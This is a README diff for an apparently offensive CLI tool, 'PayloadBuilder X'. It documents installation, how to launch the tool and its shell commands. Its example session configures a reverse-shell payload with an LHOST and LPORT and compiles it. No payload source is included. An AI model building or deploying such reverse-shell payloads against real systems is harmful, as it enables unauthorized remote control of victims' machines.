@@ -20,6 +20,51 @@ This project is in **pre-release**. Many features are unimplemented or incomplet
 
 ---
 
+## How to Run PayloadBuilder X
+
+Install the package (Optional)  
+If installed from PyPI: 
+```bash
+pip install pbx
+```
+Or install locally from your repo:  
+```bash
+pip install .
+```
+
+### Running the CLI 
+
+You can launch the PayloadBuilder X CLI in two ways:    
+
+- From the installed CLI command:   
+```bash
+pbx
+```
+- Or using Python directly (if running locally):
+```bash
+python3 -m pbx.main
+```
+
+### Basic Usage
+
+```txt
+list                        → show current config (* required)
+set OPT VAL[, OPT VAL…]     → update one or many options
+reset                       → clear all parameters
+clear                       → clear terminal
+build                       → compile payload
+help [cmd|opt]              → detailed help
+exit / quit                 → leave shell
+```
+Example:
+```
+payloadx> set payload_type reverse_shell, LHOST 192.168.1.10, LPORT 4444
+payloadx> list
+payloadx> build
+```
+
+---
+
 ## Directory Structure
 
 ```
